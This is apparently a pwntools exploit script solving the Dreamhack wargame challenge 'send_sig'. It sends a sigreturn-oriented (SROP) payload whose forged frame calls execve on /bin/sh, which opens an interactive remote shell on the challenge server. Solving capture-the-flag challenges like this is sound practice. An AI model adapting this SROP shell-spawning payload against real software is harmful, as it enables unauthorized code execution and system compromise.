#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"

e = ELF("./send_sig")
HOST = "host1.dreamhack.games"
PORT = 8794
#HOST = "127.0.0.1"
#PORT = 12343
conn = remote(HOST, PORT)

#conn = process("./send_sig")
pop_rax_ret = 0x00000000004010ae #: pop rax ; ret
syscall =     0x00000000004010b0 #: syscall
binsh =       0x0000000000402000

payload = b"\x90" * 0x10
payload += p64(pop_rax_ret)
payload += p64(0x0f)
payload += p64(syscall)

"""
payload += p64(0x00) * 13 # padding
payload += p64(binsh) #rdi
payload += p64(0x00) * 4
payload += p64(0x3b) #rax
payload += p64(0x00)*2
payload += p64(syscall)
payload += p64(0x00)
payload += p64(0x33)
payload += p64(0)*2
payload += p64(0x2b)
payload = payload.ljust(288, b'\x00')
"""

frame = SigreturnFrame(arch="amd64")
frame.rax = 0x3b
frame.rdi = binsh
frame.rsp = syscall
frame.rip = syscall

payload += bytes(frame)

conn.sendafter("Signal:", payload)
conn.interactive()
